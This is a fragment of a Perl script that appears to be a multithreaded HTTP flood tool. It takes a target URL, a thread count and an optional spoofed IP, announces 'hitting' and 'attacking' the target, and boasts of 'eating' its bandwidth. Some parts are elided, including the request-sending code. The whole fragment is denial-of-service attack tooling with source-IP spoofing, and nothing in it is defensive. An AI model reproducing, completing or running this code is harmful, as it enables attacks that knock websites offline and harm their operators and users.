...
sub comenzar {
    $SIG{'KILL'} = sub { print "\e[1;32mattacking...\e[0m\n"; threads->exit(); };
    $url = $ARGV[0];
    ...
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
        print "\e[1;34m[\e[1;32m-\e[1;34m]\e[1;32m...ready...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("\e[1;31m[x] Wrong URL format!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ...
    $file =~ s/\s/ /g;
    print join "","\e[1;34m[\e[1;31m!\e[1;34m]\e[1;32mconnections\e[0m ","\e[1;31m",$max," \e[1;32mthreads!\e[0m\n";
    $file = "/".$file if($file !~ /^\//);
    print join "","\e[1;32mhitting: ","\e[1;31m",$host,":",$puerto,"\e[1;32m\nattacking: ","\e[1;31m",$file,"\e[0m\n\n";
    if($ipfake eq "") {
    ...
    print "\e[1;34m[\e[1;32m-\e[1;34m] \e[1;31m...\e[1;33mLEGITMT EATING UR BW\e[0m\e[1;31m...\e[0m\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
